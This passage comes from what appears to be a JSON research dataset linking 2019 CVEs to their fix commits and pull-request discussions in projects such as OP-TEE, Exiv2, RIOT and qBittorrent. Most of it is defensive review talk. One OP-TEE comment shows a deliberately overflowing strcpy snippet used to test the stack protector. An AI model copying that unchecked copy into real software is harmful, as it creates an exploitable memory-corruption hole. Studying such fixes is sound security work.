\"ta-dev-kit: Introduce CFG_TA_FORTIFY_SOURCE\"?\r\n\r\nAlso I think the Travis warnings (missing commit descriptions) should be fixed. When introducing a new flag, we should explain what it does, why we add it, and what is its default value. Things I expect to understand when reading the description are: what is a stack protector? What happens when the \"protection\" detects that something is wrong? Does the TA panic? Does the TEE core panic? Same for the \"fortify\" option.\r\n\r\nIn the end I'd like to have 4 commits:\r\n```\r\n    ta: introduce CFG_TA_STACK_PROTECTOR_STRONG\r\n    ta: introduce CFG_TA_FORTIFY_SOURCE\r\n    core: introduce CFG_CORE_STACK_PROTECTOR_STRONG\r\n    core: introduce CFG_CORE_FORTIFY_SOURCE\r\n```\r\n @jforissier , makes sense. I'll do another clean-up / clarification round, stay tuned. Easier said that done trying to trigger the protectors, since I get data abort when trying to put together examples that should trigger the stack-protector for example. I'd expect some output like \"`*** stack smashing detected ***` at least before the data-abort. @jbech-linaro hard to find documentation, but it looks like the compiler will just call `__stack_chk_fail()`, which we happen to define here: https://github.com/OP-TEE/optee_os/blob/3.3.0/lib/libutils/isoc/stack_check.c\r\nAt least, that's what I can see in the disassembly (`tee.dmp` or `objdump -ldx ta.elf`).\r\n\r\nSo, if I understand correctly, the TA or the TEE core thread would just hang when stack smashing is detected (instead of proceeding with corrupt data). I think I can trigger it successfully now, since without using the flags I get data-aborts, with the flags enabled I get stuck. I've tried to figure out where I am by checking GDB, but so far I haven't been able to make sense out of the address. I'll try to see whether it ends up in `stack_check.c` or not. @jbech-linaro sounds good. Perhaps `__stack_chk_fail()` should `EMSG()` and call `panic()` (`ifdef __KERNEL__`) or `abort()`/`utee_panic()` (user mode TA). Or is there any reason we could not do that in this context? I've tried setting a breakpoint at `__stack_chk_fail`, but it doesn't seem to hang there. But I can see my data (`foo(AAAA...)`) in the `r2` when breaking, so I suspect it is stuck somewhere in strcpy, and/or \"panic\" while(1) as a consequence of this.\r\n```bash\r\nfoo(\"AAAAAAA.....\");\r\n\r\nvoid foo(char *bar) {\r\nchar buffer[16];\r\nstrcpy(buffer, bar)\r\n}\r\n```\r\n\r\n```\r\nr2 = 0x00414141\r\n...\r\n```\r\nI think I will skip the CFG_-patches and submit them as a separate PR if/when I have some time to spare. They weren't really part of the Riscure report, I just added it, since I thought it'd be useful to catch things. > I think I will skip the CFG_-patches [...]\r\n\r\nSure. They are definitely useful IMO, but certainly not required for 3.4.0. Thanks! Two things ....\r\n1. I've removed the CFG patches from this PR and pushed that.\r\n2. I've rebuilt QEMU with SMP=1 and now!!! Lo and behold! I'm stuck in .... drum roll ... `__stack_chk_fail() { while (1) }`.\r\n\r\nSo it seems to work as expected.\r\n\r\nAnyhow, as before, if IBART and friends are happy:\r\nSquashed, rebased and tag(s) applied (should be) ready for merge! Thanks!",
            "pr_title_words": 8,
            "comments_words": 780,
            "total_other_info_words": 788
        },
        {
            "cve-id": "CVE-2019-13226",
            "commit_url": "https://github.com/linuxdeepin/deepin-clone/commit/e079f3e2712b4f8c28e3e63e71ba1a1f90fce1ab",
            "commit_msg": "fix: Do not use the \"/tmp\" directory\n\nhttps://github.com/linuxdeepin/deepin-clone/issues/16\nhttps://bugzilla.opensuse.org/show_bug.cgi?id=1130388",
            "commit_msg_words": 9,
            "other_info": "\u4fee\u590d\u9690\u85cf\u7684\u5b89\u5168\u9690\u60a3",
            "pr_title_words": 1,
            "comments_words": 0,
            "total_other_info_words": 1
        },
        {
            "cve-id": "CVE-2019-12980",
            "commit_url": "https://github.com/libming/libming/commit/a009a38dce1d9316cad1ab522b813b1d5ba4c62a",
            "commit_msg": "Fix left shift of a negative value in SWFInput_readSBits. Check for number before before left-shifting by (number-1).",
            "commit_msg_words": 17,
            "other_info": "Fix several potential vulnerabilities",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2019-8381",
            "commit_url": "https://github.com/appneta/tcpreplay/commit/dae97cbafc5c06ebbc6b34e76ba614104f1b73e1",
            "commit_msg": "Bugs #538 add check for packet length in do_checksum()",
            "commit_msg_words": 9,
            "other_info": "Bugs #538 add check for packet length in do_checksum()",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2019-13640",
            "commit_url": "https://github.com/qbittorrent/qBittorrent/commit/a610c8567e55516231d199b551e0e7e2dca70cbf",
            "commit_msg": "Prevent command injection via \"Run external program\" function\n\nCloses #10925.",
            "commit_msg_words": 10,
            "other_info": "Prevent command injection via \"Run external program\" function Everyone, thanks for the review!",
            "pr_title_words": 8,
            "comments_words": 5,
            "total_other_info_words": 13
        },
        {
            "cve-id": "CVE-2019-10907",
            "commit_url": "https://github.com/airsonic/airsonic/commit/3e07ea52885f88d3fbec444dfd592f27bfb65647",
            "commit_msg": "Use a random key to \"encrypt\" the remember-me cookie's value\n\nSince Spring's default remember-me technique is\nterrible security-wise (`user:timstamp:md5(use:timestamp:password:key)`),\nwe should at least use a random key, instead of a fixed one,\notherwise, and attacker able to capture the cookies\nmight be able to trivially bruteforce offline\nthe password of the associated user.",
            "commit_msg_words": 53,
            "other_info": "Use a random key to \"encrypt\" the remember-me cookie's value Rather annoyingly (esp. when running a development server) this requires to login each time you reload the server, even when \"Remember me\" is checked. Is there a better way, maybe by storing the random key for a given amount of time / passing it as a property on the command-line? I don't think that storing it on the filesystem is a good idea, I prefer to have an ephemeral one, invalidating all remember-me cookies on each restart. I think some users are going to be okay with the tradeoff of storing it on the filesytem. What about making this a property that can be optionally set? If its absent, generate it I don't really see a use-case for regular users to be honest.\r\nBut it wouldn't really harm to have a property anyway, so if anyone wants to implement it, it's fine by me.",
            "pr_title_words": 10,
            "comments_words": 144,
            "total_other_info_words": 154
        },
        {
            "cve-id": "CVE-2019-6498",
            "commit_url": "https://github.com/labapart/gattlib/commit/42cf4e63ee7f0eb830644ea37c37a2a9e256befd",
            "commit_msg": "Fix stack-based bufferoverflow\n\nFix: #81\nFix: #82",
            "commit_msg_words": 7,
            "other_info": "Fix stack-based bufferoverflow",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2019-10877",
            "commit_url": "https://github.com/teeworlds/teeworlds/commit/d25869626a8cfbdd320929ba93ce73abed1402ce",
            "commit_msg": "Fix integer overflow when computing tilemap size. Fixes #2071",
            "commit_msg_words": 9,
            "other_info": "Fix integer overflow when computing tilemap size. Fixes #2071 - Fixed the commit fixing #2071 with @oy's instructions\r\n- Retrieved e086f4b35b1adf7edc35b4ad332dc7ed1edc5988 to fix #2073",
            "pr_title_words": 9,
            "comments_words": 15,
            "total_other_info_words": 24
        },
        {
            "cve-id": "CVE-2019-17177",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/9fee4ae076b1ec97b97efb79ece08d1dab4df29a",
            "commit_msg": "Fixed #5645: realloc return handling",
            "commit_msg_words": 5,
            "other_info": "Fixed #5645: realloc return handling \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4181/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4182/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4183/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4184/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4185/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4186/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4187/",
            "pr_title_words": 5,
            "comments_words": 98,
            "total_other_info_words": 103
        },
        {
            "cve-id": "CVE-2019-16718",
            "commit_url": "https://github.com/radareorg/radare2/commit/5411543a310a470b1257fb93273cdd6e8dfcb3af",
            "commit_msg": "More fixes for the CVE-2019-14745",
            "commit_msg_words": 5,
            "other_info": "Fix multiple quote cmd issue ##core # [Codecov](https://codecov.io/gh/radare/radare2/pull/14989?src=pr&el=h1) Report\n> Merging [#14989](https://codecov.io/gh/radare/radare2/pull/14989?src=pr&el=desc) into [master](https://codecov.io/gh/radare/radare2/commit/657514849ee80f1a958ecb1a911aef1dfd35ed96?src=pr&el=desc) will **decrease** coverage by `<.01%`.\n> The diff coverage is `100%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/radare/radare2/pull/14989/graphs/tree.svg?width=650&token=ATuAGonwJ9&height=150&src=pr)](https://codecov.io/gh/radare/radare2/pull/14989?src=pr&el=tree)\n\n```diff\n@@            Coverage Diff             @@\n##           master   #14989      +/-   ##\n==========================================\n- Coverage   38.32%   38.32%   -0.01%     \n==========================================\n  Files         961      961              \n  Lines      315267   315267              \n==========================================\n- Hits       120818   120816       -2     \n- Misses     194449   194451       +2\n```\n\n\n| [Impacted Files](https://codecov.io/gh/radare/radare2/pull/14989?src=pr&el=tree) | Coverage \u0394 | |\n|---|---|---|\n| [libr/core/canal.c](https://codecov.io/gh/radare/radare2/pull/14989/diff?src=pr&el=tree#diff-bGlici9jb3JlL2NhbmFsLmM=) | `56.88% <100%> (\u00f8)` | :arrow_up: |\n| [libr/core/cmd.c](https://codecov.io/gh/radare/radare2/pull/14989/diff?src=pr&el=tree#diff-bGlici9jb3JlL2NtZC5j) | `45.87% <100%> (\u00f8)` | :arrow_up: |\n| [libr/core/project.c](https://codecov.io/gh/radare/radare2/pull/14989/diff?src=pr&el=tree#diff-bGlici9jb3JlL3Byb2plY3QuYw==) | `57.47% <0%> (-0.34%)` | :arrow_down: |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/radare/radare2/pull/14989?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/radare/radare2/pull/14989?src=pr&el=footer). Last update [6575148...2d99a12](https://codecov.io/gh/radare/radare2/pull/14989?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).",
            "pr_title_words": 6,
            "comments_words": 135,
            "total_other_info_words": 141
        },
        {
            "cve-id": "CVE-2019-17402",
            "commit_url": "https://github.com/Exiv2/exiv2/commit/683451567284005cd24e1ccb0a76ca401000968b",
            "commit_msg": "crwimage: Check offset and size against total size\n\nCorrupted or specially crafted CRW images might exceed the overall\nbuffersize.\n\nFixes #1019",
            "commit_msg_words": 21,
            "other_info": "crwimage: Check offset and size against total size Thank you for the quick fix! I'll add a test for this ASAP and will take a look in further detail. Not super-happy about the location. looks odd to me, but I am not sure that the base read() should decide this, and the readDirectory() cannot decide it. Thanks for the fix! \r\n\r\nAlthough it might not look as the best place where to place the new lines, I would not worry too much about it right now. None of use know that class in depth to judge where it should go. If somebody ever tries to study & improve that class, we could take the opportunity to better organise the code.\r\n\r\nI'll wait for the regression test promised by @D4N  before approving. \r\n\r\n By the way, I could reproduce the issue in both `master` and `0.27-maintance`.  > Not super-happy about the location. looks odd to me, but I am not sure that the base read() should decide this, and the readDirectory() cannot decide it.\r\n\r\nYes, the location doesn't feel right to me either to be honest.\r\n\r\nI am currently suspecting that the bug is in `CiffComponent::doRead`:\r\n``` C++\r\n    void CiffComponent::doRead(const byte* pData,\r\n                               uint32_t    size,\r\n                               uint32_t    start,\r\n                               ByteOrder   byteOrder)\r\n    {\r\n        if (size < 10) throw Error(kerNotACrwImage);\r\n        tag_ = getUShort(pData + start, byteOrder);\r\n\r\n        DataLocId dl = dataLocation();\r\n        assert(dl == directoryData || dl == valueData);\r\n\r\n        if (dl == valueData) {\r\n            size_   = getULong(pData + start + 2, byteOrder);\r\n            offset_ = getULong(pData + start + 6, byteOrder);\r\n        }\r\n        if ( size_ > size || offset_ > size ) throw Error(kerOffsetOutOfRange); // #889\r\n        if (dl == directoryData) {\r\n            // snip\r\n        }\r\n        pData_ = pData + offset_;\r\n#ifdef EXIV2_DEBUG_MESSAGES\r\n        // snip\r\n#endif\r\n\r\n    } // CiffComponent::doRead\r\n```\r\n\r\nThe malformed file hits the `dl == valueData` branch and extracts the following values:\r\n```\r\nsize_ = 5608\r\noffset_ = 6978\r\n```\r\nbut the actual size of the buffer `pData` is given in `size` (10052) which is less then `size_ + offset_`. Unfortunately, the check in the line after the if doesn't find this case\u2026\r\n\r\nSo from my current (very tired) point of view, it would be the easiest to just set `size_ = size - offset();` below the line where `pData_` is set. But when we start doing that, then we might as well remove the throw in the line with the comment `// #889`\u2026 I'll try to take another look at this tomorrow. I pondered a bit on this and I think that check can be moved inside read(). It is trying to gather its own size and can well know if it exceeds the overall size.\r\n\r\nThe other question is whether it should try to continue to parse the CRW (by setting size_ to size - offset). But that might cause an endless loop if you choose an offset that is big enough to point you back to the start of  the initial structure, then you parse down again, hit the faulty offset etc.\r\n\r\nI'd opt for abort here, tbh.\r\n\r\nand yes, you were tired, 5608 + 6978 is 12586 which is well over 10052 ;) # [Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/1020?src=pr&el=h1) Report\n> Merging [#1020](https://codecov.io/gh/Exiv2/exiv2/pull/1020?src=pr&el=desc) into [master](https://codecov.io/gh/Exiv2/exiv2/commit/401e658d609e5ffd95294ed264f7c18c2605b752?src=pr&el=desc) will **increase** coverage by `0.05%`.\n> The diff coverage is `100%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/Exiv2/exiv2/pull/1020/graphs/tree.svg?width=650&token=O9G7Iswx26&height=150&src=pr)](https://codecov.io/gh/Exiv2/exiv2/pull/1020?src=pr&el=tree)\n\n```diff\n@@            Coverage Diff             @@\n##           master    #1020      +/-   ##\n==========================================\n+ Coverage   71.18%   71.24%   +0.05%     \n==========================================\n  Files         148      148              \n  Lines       19418    19457      +39     \n==========================================\n+ Hits        13823    13862      +39     \n  Misses       5595     5595\n```\n\n\n| [Impacted Files](https://codecov.io/gh/Exiv2/exiv2/pull/1020?src=pr&el=tree) | Coverage \u0394 | |\n|---|---|---|\n| [src/crwimage\\_int.cpp](https://codecov.io/gh/Exiv2/exiv2/pull/1020/diff?src=pr&el=tree#diff-c3JjL2Nyd2ltYWdlX2ludC5jcHA=) | `38.99% <100%> (+0.23%)` | :arrow_up: |\n| [src/exiv2.cpp](https://codecov.io/gh/Exiv2/exiv2/pull/1020/diff?src=pr&el=tree#diff-c3JjL2V4aXYyLmNwcA==) | `100% <0%> (\u00f8)` | :arrow_up: |\n| [samples/write2-test.cpp](https://codecov.io/gh/Exiv2/exiv2/pull/1020/diff?src=pr&el=tree#diff-c2FtcGxlcy93cml0ZTItdGVzdC5jcHA=) | `98.25% <0%> (+0.02%)` | :arrow_up: |\n| [samples/geotag.cpp](https://codecov.io/gh/Exiv2/exiv2/pull/1020/diff?src=pr&el=tree#diff-c2FtcGxlcy9nZW90YWcuY3Bw) | `80.98% <0%> (+0.09%)` | :arrow_up: |\n| [samples/write-test.cpp](https://codecov.io/gh/Exiv2/exiv2/pull/1020/diff?src=pr&el=tree#diff-c2FtcGxlcy93cml0ZS10ZXN0LmNwcA==) | `93.39% <0%> (+0.12%)` | :arrow_up: |\n| [samples/exiv2json.cpp](https://codecov.io/gh/Exiv2/exiv2/pull/1020/diff?src=pr&el=tree#diff-c2FtcGxlcy9leGl2Mmpzb24uY3Bw) | `79.61% <0%> (+0.13%)` | :arrow_up: |\n| [samples/exifdata-test.cpp](https://codecov.io/gh/Exiv2/exiv2/pull/1020/diff?src=pr&el=tree#diff-c2FtcGxlcy9leGlmZGF0YS10ZXN0LmNwcA==) | `94.18% <0%> (+0.13%)` | :arrow_up: |\n| [samples/xmpsample.cpp](https://codecov.io/gh/Exiv2/exiv2/pull/1020/diff?src=pr&el=tree#diff-c2FtcGxlcy94bXBzYW1wbGUuY3Bw) | `93.54% <0%> (+0.14%)` | :arrow_up: |\n| [samples/iptcprint.cpp](https://codecov.io/gh/Exiv2/exiv2/pull/1020/diff?src=pr&el=tree#diff-c2FtcGxlcy9pcHRjcHJpbnQuY3Bw) | `96.29% <0%> (+0.29%)` | :arrow_up: |\n| [samples/tiff-test.cpp](https://codecov.io/gh/Exiv2/exiv2/pull/1020/diff?src=pr&el=tree#diff-c2FtcGxlcy90aWZmLXRlc3QuY3Bw) | `91.37% <0%> (+0.3%)` | :arrow_up: |\n| ... and [10 more](https://codecov.io/gh/Exiv2/exiv2/pull/1020/diff?src=pr&el=tree-more) | |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/1020?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/1020?src=pr&el=footer). Last update [401e658...73b874f](https://codecov.io/gh/Exiv2/exiv2/pull/1020?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).",
            "pr_title_words": 8,
            "comments_words": 712,
            "total_other_info_words": 720
        },
        {
            "cve-id": "CVE-2019-18635",
            "commit_url": "https://github.com/mooltipass/moolticute/commit/a6df0989f737bfae5e87a9ffbce6f4949be77ed7",
            "commit_msg": "Fix possible nullptr dereference in MPDevice_win",
            "commit_msg_words": 6,
            "other_info": "Fix possible nullptr dereference in MPDevice_win",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2019-1000006",
            "commit_url": "https://github.com/RIOT-OS/RIOT/commit/2840b3825eb6e0b7320fb111d06832ca9a9e3148",
            "commit_msg": "sock_dns: fix out-of-bound errors\n\nFixes #10739",
            "commit_msg_words": 6,
            "other_info": "sock_dns: fix out-of-bound errors Fixed some typos and unrelated changes that snuck in. Should be good for review now. How I sometimes wish C had exceptions. > How I sometimes wish C had exceptions.\r\n\r\nThose don't make your life any better and bloat the code (even Rust [does something else](https://doc.rust-lang.org/book/ch09-02-recoverable-errors-with-result.html)) Addressed newest comments @kaspar030 backport to 2018.10? > @kaspar030 backport to 2018.10?\r\n\r\nYeah, I seem to remember that we intent to provide security fixes for the current release? I think this can be squashed? Squashed on top of original merge base. Fixed and squashed whitespace error reported by Murdock (here is the diff https://github.com/RIOT-OS/RIOT/compare/b1de000aef472e9508c0dd6b7a00ec9cd4124a34..1a61b8aadf18d437bb85660506aeb104313e79d0) @riot-ci is happy. @nmeum @pyropeter @kaspar030 @maribu are you? I just tried the test on native, it returns \"error resolving example.org\".\r\n\r\ndnsmasq seems to have gotten the request:\r\n\r\n```\r\n[kaspar@ng riot (minimize)]$ sudo dnsmasq -d -2 -z -i riot0 -q --no-resolv \\                                                                 \r\n>         --dhcp-range=::1,constructor:riot0,ra-only \\\r\n>         --listen-address 2001:db8::1 \\\r\n>         --host-record=example.org,10.0.0.1,2001:db8::1\r\ndnsmasq: started, version 2.80 cachesize 150\r\ndnsmasq: compile time options: IPv6 GNU-getopt DBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset auth DNSSEC loop-detect inotify dumpfile\r\ndnsmasq: warning: no upstream servers configured\r\ndnsmasq-dhcp: router advertisement on riot0\r\ndnsmasq-dhcp: router advertisement on 2001:db8::, constructed for riot0                                                                      \r\ndnsmasq-dhcp: RTR-ADVERT(riot0) 2001:db8::\r\ndnsmasq: read /etc/hosts - 0 addresses\r\ndnsmasq-dhcp: RTR-SOLICIT(riot0)\r\ndnsmasq-dhcp: RTR-ADVERT(riot0) 2001:db8::\r\ndnsmasq: config example.org is 2001:db8::1\r\ndnsmasq: config example.org is 10.0.0.1\r\ndnsmasq: config example.org is 2001:db8::1\r\ndnsmasq: config example.org is 10.0.0.1\r\n```\r\n dns.c line 124 returns ```-EMULTIHOP``` > dns.c line 124 returns `-EMULTIHOP`\r\n\r\nsorry, ```-EBADMSG``` Nope, it got moved to line 158. However, I found the bug (the return in l\n101 is wrong as it does not return the length of the hostname, but the\noffset of the end of the hostname).\n\n>\n >\n> I just tried the test on native, it returns \"error resolving example.org\".\n>\nPlease try again with 4c507e909d9b326801e2632f84c73ae89dfd5675\n > Please try again with [4c507e9](https://github.com/RIOT-OS/RIOT/commit/4c507e909d9b326801e2632f84c73ae89dfd5675)\r\n\r\nworks now. pls squash! Squashed. Diff of force push should show no difference ;)  Thanks everyone involved, and thanks @miri64 for dealing with the mess I created!\r\n\r\nLessons I learned:\r\n\r\n- sure it's fun to quickly hack together something like a DNS client. But just because it is working doesn't mean that it is safe. *always* double check when sharing it .\r\n- RIOT's review process needs a security tag. The buffer overflows in this code were so obvious...\r\n- even community members don't know about security@riot-os.org. Maybe we should add a big(er) note in the issue template?\r\n > Thanks everyone involved, and thanks @miri64 for dealing with the mess I created!\r\n\r\nWelp, I merged the mess IIRC, so I was as obligated as you ;-). > * sure it's fun to quickly hack together something like a DNS client. But just because it is working doesn't mean that it is safe. _always_ double check when sharing it .\r\n\r\nFailure tests, failure tests, failure tests. If I find some time tomorrow I will provide a PR for that (in a similar way as #10382 and #10392) before I tackle @maribu's suggestions in https://github.com/RIOT-OS/RIOT/pull/10740#pullrequestreview-190923775. Backport provided in #10757 (forgot about that)",
            "pr_title_words": 4,
            "comments_words": 509,
            "total_other_info_words": 513
        },
        {
            "cve-id": "CVE-2019-10158",
            "commit_url": "https://github.com/infinispan/infinispan/commit/936f26826e8bb60758ff70b8f1f2eb2862648e79",
            "commit_msg": "ISPN-10224 Fix session fixation protection",
            "commit_msg_words": 5,
            "other_info": "ISPN-10224 Fix session protection @danberindei already been backported",
            "pr_title_words": 4,
            "comments_words": 4,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2019-13109",
            "commit_url": "https://github.com/Exiv2/exiv2/commit/491c3ebe3b3faa6d8f75fb28146186792c2439da",
            "commit_msg": "Avoid negative integer overflow when `iccOffset > chunkLength`.\n\nThis fixes #790.\n\n(cherry picked from commit 6fa2e31206127bd8bcac0269311f3775a8d6ea21)",
            "commit_msg_words": 16,
            "other_info": "Add Safe::cast<T> # [Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/898?src=pr&el=h1) Report\n> Merging [#898](https://codecov.io/gh/Exiv2/exiv2/pull/898?src=pr&el=desc) into [master](https://codecov.io/gh/Exiv2/exiv2/commit/98e63e4bb4d78ee9dec2ba9dca2aa1785278e51c?src=pr&el=desc) will **increase** coverage by `0.03%`.\n> The diff coverage is `100%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/Exiv2/exiv2/pull/898/graphs/tree.svg?width=650&token=O9G7Iswx26&height=150&src=pr)](https://codecov.io/gh/Exiv2/exiv2/pull/898?src=pr&el=tree)\n\n```diff\n@@            Coverage Diff             @@\n##           master     #898      +/-   ##\n==========================================\n+ Coverage   71.09%   71.12%   +0.03%     \n==========================================\n  Files         148      148              \n  Lines       19376    19400      +24     \n==========================================\n+ Hits        13775    13799      +24     \n  Misses       5601     5601\n```\n\n\n| [Impacted Files](https://codecov.io/gh/Exiv2/exiv2/pull/898?src=pr&el=tree) | Coverage \u0394 | |\n|---|---|---|\n| [src/safe\\_op.hpp](https://codecov.io/gh/Exiv2/exiv2/pull/898/diff?src=pr&el=tree#diff-c3JjL3NhZmVfb3AuaHBw) | `100% <100%> (\u00f8)` | :arrow_up: |\n| [unitTests/test\\_safe\\_op.cpp](https://codecov.io/gh/Exiv2/exiv2/pull/898/diff?src=pr&el=tree#diff-dW5pdFRlc3RzL3Rlc3Rfc2FmZV9vcC5jcHA=) | `100% <100%> (\u00f8)` | :arrow_up: |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/898?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/898?src=pr&el=footer). Last update [98e63e4...65591ca](https://codecov.io/gh/Exiv2/exiv2/pull/898?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).\n Gosh, Dan.  That's amazing code and I have no idea what it does!\r\n\r\nI'm going to leave it to @piponazo to approve (although I will approve if you ask me).\r\n\r\nI got it to built and pass the test suite with msvc 2017/Release and 2019/Release (with a little code change).\r\n\r\nWhen I built, I got this error:\r\n```\r\n  pngchunk_int.cpp                                                                                                                                                                                                                               \r\nc:\\msys64\\home\\rmills\\gnu\\github\\exiv2\\master\\src\\safe_op.hpp(347): error C2064: term does not evaluate to a function taking 0 arguments (compiling source file C:\\msys64\\home\\rmills\\gnu\\github\\exiv2\\master\\src\\pngchunk_int.cpp) [C:\\msys64\\h \r\nome\\rmills\\gnu\\github\\exiv2\\master\\build\\src\\exiv2lib_int.vcxproj]                                                                                                                                                                               \r\nc:\\msys64\\home\\rmills\\gnu\\github\\exiv2\\master\\src\\safe_op.hpp(348): error C2064: term does not evaluate to a function taking 0 arguments (compiling source file C:\\msys64\\home\\rmills\\gnu\\github\\exiv2\\master\\src\\pngchunk_int.cpp) [C:\\msys64\\h \r\nome\\rmills\\gnu\\github\\exiv2\\master\\build\\src\\exiv2lib_int.vcxproj]                                                                                                                                                                               \r\nc:\\msys64\\home\\rmills\\gnu\\github\\exiv2\\master\\src\\safe_op.hpp(348): error C2039: 'type': is not a member of 'std::enable_if<false,void>' (compiling source file C:\\msys64\\home\\rmills\\gnu\\github\\exiv2\\master\\src\\pngchunk_int.cpp) [C:\\msys64\\h \r\nome\\rmills\\gnu\\github\\exiv2\\master\\build\\src\\exiv2lib_int.vcxproj]                                                                                                                                                                               \r\n  C:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Community\\VC\\Tools\\MSVC\\14.16.27023\\include\\type_traits(227): note: see declaration of 'std::enable_if<false,void>' (compiling source file C:\\msys64\\home\\rmills\\gnu\\github\\exiv2\\master\\src\\pngchunk_int.cpp)                                                                                                                                                                                                                           \r\nc:\\msys64\\home\\rmills\\gnu\\github\\exiv2\\master\\src\\safe_op.hpp(348): error C2146: syntax error: missing '>' before identifier 'type' (compiling source file C:\\msys64\\home\\rmills\\gnu\\github\\exiv2\\master\\src\\pngchunk_int.cpp) [C:\\msys64\\home\\r \r\nmills\\gnu\\github\\exiv2\\master\\build\\src\\exiv2lib_int.vcxproj]  \r\n```\r\n\r\nMy \"fix\" is to comment off some code in safe_op.hpp\r\n\r\n```\r\n    namespace Internal\r\n    {\r\n        template <typename from, typename to, typename = void>\r\n        struct is_safely_convertible : std::false_type\r\n        {\r\n            static_assert(std::is_integral<from>::value&& std::is_integral<to>::value,\r\n                          \"from and to must both be integral types\");\r\n        };\r\n/*\r\n        template <typename from, typename to>\r\n        struct is_safely_convertible<\r\n            from, to,\r\n            typename std::enable_if<((std::numeric_limits<from>::max() <= std::numeric_limits<to>::max()) &&\r\n                                     (std::numeric_limits<from>::min() >= std::numeric_limits<to>::min()))>::type>\r\n            : std::true_type\r\n        {\r\n        };\r\n*/\r\n```\r\n\r\n#### My reason to try this\r\n\r\nYou have two definitions for the template:\r\n```\r\ntemplate <typename from, typename to, typename = void>\r\nand\r\ntemplate <typename from, typename to>\r\n```\r\nThis might be ambiguous.\r\n\r\n#### Other ideas:\r\n\r\nI tried some other guesses and none of them compiled.  For example, I changed `::type` to `::typename` because it complained:\r\n\r\n```\r\nsafe_op.hpp(348): error C2146: syntax error: missing '>' before identifier 'type'\r\n``` \r\n\r\n#### My Suggestions\r\n\r\n1) is `type` correct on line 348?  For sure, I don't know what it means and apparently the compiler doesn't either!\r\n\r\n2) Only compile `template <typename from, typename to> .... };` for `#ifndef _MSC_VER`.  You'll loose safety for MSVC builds.  It could be a compiler bug that goes away in the future.  However it's there with both 2017 and 2019.\r\n\r\n3) It could be an SDK issue.  For both 2017 and 2019, CMake reports:\r\n```\r\nSelecting Windows SDK version 10.0.17763.0 to target Windows 10.0.17134.\r\n```\r\nI suspect a lot of the template voodoo comes from the SDK and not the compiler.  As CMake's announcing the SDK, it's likely that we could force him to use a different SDK with different consequences. Robin Mills <notifications@github.com> writes:\n\n> Gosh, Dan.  That's amazing code and I have no idea what it does!\n\nThat's usually a bad sign.\n\n>\n> I'm going to leave it to @piponazo to approve (although I will approve if you ask me).\n>\n> I got it to built and pass the test suite with msvc 2017/Release and 2019/Release (with a little code change).\n>\n> When I built, I got this error:\n> ```\n>   pngchunk_int.cpp                                                                                                                                                                                                                               \n> c:\\msys64\\home\\rmills\\gnu\\github\\exiv2\\master\\src\\safe_op.hpp(347): error C2064: term does not evaluate to a function taking 0 arguments (compiling source file C:\\msys64\\home\\rmills\\gnu\\github\\exiv2\\master\\src\\pngchunk_int.cpp) [C:\\msys64\\h \n> ome\\rmills\\gnu\\github\\exiv2\\master\\build\\src\\exiv2lib_int.vcxproj]                                                                                                                                                                               \n> c:\\msys64\\home\\rmills\\gnu\\github\\exiv2\\master\\src\\safe_op.hpp(348): error C2064: term does not evaluate to a function taking 0 arguments (compiling source file C:\\msys64\\home\\rmills\\gnu\\github\\exiv2\\master\\src\\pngchunk_int.cpp) [C:\\msys64\\h \n> ome\\rmills\\gnu\\github\\exiv2\\master\\build\\src\\exiv2lib_int.vcxproj]                                                                                                                                                                               \n> c:\\msys64\\home\\rmills\\gnu\\github\\exiv2\\master\\src\\safe_op.hpp(348): error C2039: 'type': is not a member of 'std::enable_if<false,void>' (compiling source file C:\\msys64\\home\\rmills\\gnu\\github\\exiv2\\master\\src\\pngchunk_int.cpp) [C:\\msys64\\h \n> ome\\rmills\\gnu\\github\\exiv2\\master\\build\\src\\exiv2lib_int.vcxproj]                                                                                                                                                                               \n>   C:\\Program Files 